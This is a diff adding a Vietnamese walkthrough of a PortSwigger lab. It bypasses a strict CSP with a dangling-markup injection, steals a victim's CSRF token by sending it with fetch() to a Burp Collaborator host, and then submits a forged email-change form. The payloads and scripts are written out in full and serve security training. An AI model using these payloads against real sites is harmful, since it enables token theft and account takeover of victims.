@@ -259,6 +259,46 @@ Sau khi submit, bài lab được giải thành công.
 # 28. Reflected XSS with AngularJS sandbox escape and CSP
 
 # 29. Reflected XSS protected by very strict CSP, with dangling markup attack
+Nhận thấy trong trang `/my-account`, nếu ta thêm tham số `?email=abc` thì tag input trong chức năng đổi email cũng sẽ có giá trị là `abc`. Thử với `?email="><a>Hello</a>` thì thấy thẻ a được chèn vào. Như vậy website có hổng XSS với thuộc tính `email`. Tuy nhiên các đoạn code javascript được inject vào đều bị chặn do có strict CSP.
+
+Ta sẽ dùng kỹ thuật "Evading CSP" để bypass CSP. Thử thay đổi 
+```?email=%22%3E%3Ca+href%3D%22https%3A%2F%2Fexploit-0a2500910398f0fac059a33001b9007b.exploit-server.net%2Fexploit%22%3EClick+me%3C%2Fa%3E%3Cbase+target%3D%27``` 
+Khi đó, tag `<input>` sẽ trở thành:
+
+![image](https://user-images.githubusercontent.com/103978452/210034677-9c81f06b-1565-4161-af6b-127d5cb2f47f.png)
+
+Ta thấy csrf token đã nằm trong thuộc tính `target` của tag `<base>`. Như vậy khi click vào thẻ `<a>`, sẽ mở ra một cửa sổ mới, với thuộc tính `window.name` chứa csrf token.
+
+Vào exploit server, cấu hình đoạn HTML sau:
+
+```
+<script>
+if(window.name==''){
+document.location="https://0aab008703b2f0a4c051a494005f0030.web-security-academy.net/my-account?email=%22%3E%3Ca+href%3D%22https%3A%2F%2Fexploit-0a2500910398f0fac059a33001b9007b.exploit-server.net%2Fexploit%22%3EClick+me%3C%2Fa%3E%3Cbase+target%3D%27";
+}else{
+fetch('https://8irq370clmt6duqr781i0yxfo6u3is.oastify.com?code='+encodeURIComponent(window.name));
+}
+</script>
+```
+
+Đoạn script trên đầu tiên sẽ chuyển hướng người dùng đến trang `/my-account`, với tham số email như trên. Sau đó khi người dùng click "Click me", sẽ chuyển hướng đến exploit server và gửi csrf token về cho Burp Collaborator Server.
+
+Vào kiểm tra Burp Collaborator Client, ta thu được csrf token của nạn nhân: `gtzFzhT14qcpDa5owXuxbfOtWCJ4cZAV`
+
+![image](https://user-images.githubusercontent.com/103978452/210034379-96abda98-2382-42e3-a7f2-2ca5a8713ae7.png)
+
+Vào exploit server, cấu hình lại đoạn code sau để thực hiện csrf attack, đổi email của nạn nhân:
+
+```
+<form id=form method=POST action="https://0aab008703b2f0a4c051a494005f0030.web-security-academy.net/my-account/change-email">
+<input type="hidden" name="email" value="attacker@gmail.com">
+<input type="hidden" name="csrf" value="gtzFzhT14qcpDa5owXuxbfOtWCJ4cZAV">
+</form>
+
+<script>form.submit()</script>
+```
+
+Sau khi submit, bài lab được giải thành công.
 
 # 30. Reflected XSS protected by CSP, with CSP bypass
 Ta thấy website có lỗ hổng XSS trong chức năng search, và trong CSP có directive `report-uri /csp-report?token=`
